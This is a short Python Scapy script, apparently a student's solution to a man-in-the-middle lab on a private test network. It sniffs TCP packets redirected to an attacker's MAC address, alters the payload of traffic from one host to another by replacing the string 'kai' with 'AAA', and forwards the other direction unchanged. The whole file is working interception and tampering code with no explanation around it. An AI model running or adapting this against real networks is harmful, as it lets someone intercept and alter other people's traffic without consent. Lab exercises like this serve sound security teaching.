#!/usr/bin/env python3

from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"
# IP_M = "10.9.0.105"
# MAC_M = "02:42:0a:09:00:69"

def spoof_pkt(pkt):

    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:

        # Create a new packet based on the captured one.
        # 1) Delete the checksum in the IP & TCP headers
        #    because our modification will make them invalid.
        #    Scapy will recalculate them if these fields are missing.
        # 2) Delete the original TCP payload.
 
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        #######################################################
        # Construct the new payload based on the old payload.
        # Complete this portion of the code.
        
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load  # The original payload data
            # newdata = data   # No change is made in this sample code
            string = data.decode('utf-8')
            newdata = string.replace('kai', 'AAA')
            send(newpkt/newdata)
        else:
            send(newpkt)
        #######################################################
        
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        
        # Create new packet based on the captured one
        # Do not make any changes
        
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)

f = 'tcp and ether dst 02:42:0a:09:00:69'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
